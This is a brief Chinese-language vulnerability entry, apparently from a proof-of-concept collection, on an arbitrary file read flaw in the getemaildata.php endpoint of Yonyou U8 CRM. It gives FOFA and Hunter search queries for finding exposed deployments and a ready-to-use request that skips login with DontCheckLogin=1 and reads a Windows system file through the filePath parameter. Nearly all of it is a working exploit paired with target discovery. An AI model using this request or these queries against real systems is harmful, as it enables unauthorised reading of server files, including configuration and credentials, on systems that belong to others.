# 用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞

## 网络测绘

fofa: app="用友U8CRM"

hunter: web.body="用友U8CRM"

## POC / EXP

```
/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
```